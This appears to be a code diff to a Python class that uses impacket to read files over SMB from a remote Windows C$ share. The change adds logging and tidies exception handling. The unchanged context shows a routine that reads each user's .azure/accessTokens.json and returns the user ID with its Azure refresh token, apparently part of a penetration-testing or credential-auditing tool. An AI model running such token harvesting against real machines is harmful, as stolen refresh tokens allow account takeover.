@@ -1,4 +1,5 @@
 import json
+import logging
 from io import BytesIO
 
 from impacket import smbconnection
@@ -7,8 +8,9 @@ from connection_class import Connection
 
 
 class File:
-    def __init__(self, reg_connection: Connection, ):
+    def __init__(self, reg_connection: Connection):
         self.connection = reg_connection
+        self.logger = logging.getLogger(__name__)
 
     def read_file(self, share: str, path: str) -> bytes:
         """
@@ -20,7 +22,7 @@ class File:
         fh = BytesIO()
         try:
             self.connection.connection.getFile(share, path, fh.write)
-        except smbconnection.SessionError as e:
+        except Exception as e:
             raise e
 
         return fh.getvalue()
@@ -38,5 +40,8 @@ class File:
                     file = json.loads(self.read_file("C$", f"Users\\{folder_name}\\.azure\\accessTokens.json"))
                     return {f"Users\\{folder_name}\\.azure\\accessTokens.json": {
                         file[0]['userId']: file[0]['refreshToken']}}
-                except:
-                    pass
+                except KeyboardInterrupt:
+                    raise
+                except Exception as e:
+                    self.logger.debug("'accessTokens.json' File not found")
+
